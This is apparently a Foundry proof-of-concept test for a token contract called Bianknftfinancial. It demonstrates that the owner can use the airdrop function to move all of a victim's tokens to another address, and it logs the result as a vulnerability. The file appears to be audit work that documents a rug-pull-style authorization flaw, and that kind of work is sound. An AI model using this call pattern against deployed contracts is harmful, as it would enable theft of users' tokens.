// SPDX-License-Identifier: MIT
pragma solidity 0.7.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Bianknftfinancial.sol";

contract OwnerTransferUsersTokensTest is Test {
    Bianknftfinancial token;
    address public owner = address(0x10);
    address public victim = address(0x20);
    address public recipient = address(0x30);
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        vm.startPrank(owner);
        
        // Mock router and factory for token deployment
        address mockFactory = address(0x123);
        address mockPair = address(0x456);
        
        // Mock router.factory() call with proper parentheses
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(bytes4(0xc45a0155)), // Hardcoded "factory()" selector
            abi.encode(mockFactory)
        );
        
        // Mock factory.createPair() call with proper parentheses
        vm.mockCall(
            mockFactory,
            abi.encodeWithSelector(bytes4(0xc9c65396)), // Hardcoded "createPair(address,address)" selector
            abi.encode(mockPair)
        );
        
        // Deploy token contract
        token = new Bianknftfinancial();
        token.tradingStatus(true);
        
        // Set initial victim token balance
        uint256 initialBalance = 1000 * (10 ** token.decimals());
        token.transfer(victim, initialBalance);
        
        vm.stopPrank();
    }

    function testOwnerCanTransferUserTokens() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 victimInitialBalance = token.balanceOf(victim);
        uint256 recipientInitialBalance = token.balanceOf(recipient);
        console.log("Victim balance (pre-attack):", victimInitialBalance);
        console.log("Recipient balance (pre-attack):", recipientInitialBalance);

        console.log("--- Trigger: Owner executing airdrop ---");
        address[] memory addresses = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        addresses[0] = recipient;
        amounts[0] = victimInitialBalance;

        vm.prank(owner);
        token.airdrop(victim, addresses, amounts);

        console.log("--- AFTER-Trigger State ---");
        uint256 victimPostBalance = token.balanceOf(victim);
        uint256 recipientPostBalance = token.balanceOf(recipient);
        console.log("Victim balance (post-attack):", victimPostBalance);
        console.log("Recipient balance (post-attack):", recipientPostBalance);
        
        uint256 victimLost = victimInitialBalance - victimPostBalance;
        uint256 recipientGained = recipientPostBalance - recipientInitialBalance;
        
        console.log("Verification:");
        console.log("- Victim tokens stolen:", victimLost);
        console.log("- Recipient gained tokens:", recipientGained);
        console.log("- Are balances changed illegally?", 
            (victimLost == victimInitialBalance && victimLost == recipientGained) 
            ? "YES" : "NO");

        // Final verdict
        if(victimLost == victimInitialBalance && victimLost == recipientGained) {
            console.log("Vulnerability Exists: Owner illegally transferred user tokens without authorization");
        } else {
            console.log("Vulnerability not Exist: Token balances remain unchanged or modified incorrectly");
        }

        // Keep original assertions for test framework
        assertEq(victimPostBalance, 0, "Victim tokens not fully transferred");
        assertEq(recipientPostBalance, recipientInitialBalance + victimInitialBalance, 
            "Recipient didn't receive stolen tokens");
    }
}